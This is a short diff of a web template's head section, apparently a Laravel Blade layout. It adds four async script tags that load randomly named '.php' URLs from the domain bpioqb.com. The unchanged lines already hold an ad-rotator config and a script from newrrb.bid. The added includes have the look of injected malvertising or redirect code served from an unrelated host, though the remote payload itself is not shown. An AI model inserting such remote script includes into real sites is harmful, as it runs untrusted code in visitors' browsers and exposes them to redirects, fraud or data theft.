@@ -11,8 +11,13 @@
     <link href="{{ asset('css/starter-template.css') }}" rel="stylesheet">
     <script src="{{ asset('js/jquery.min.js') }}"></script>
 
+    <script async src="//bpioqb.com/smd1l7/921vli/pm0y30q8h687vqu687pyk3g.php"></script>
+    <script async src="//bpioqb.com/ven7l1/921vli0mp0y3/q8h867uqv/876/ypkl6qgv2.php"></script>
+    <script async src="//bpioqb.com/9nm7l1921/ilv0mp3y0/8qh786/vuq687kpy9pkeh.php"></script>
+    <script async src="//bpioqb.com/u8vl71129ivl/0pm/y30/qh8/867vuq786ykprcns.php"></script>
     <script type="text/javascript"> rbConfig={start:performance.now(),rbDomain:"newrrb.bid",rotator:'16s7h'};</script>
     <script async="async" type="text/javascript" src="//newrrb.bid/16s7h.min.js"></script>
+
 </head>
 <body>
 <div class="container">
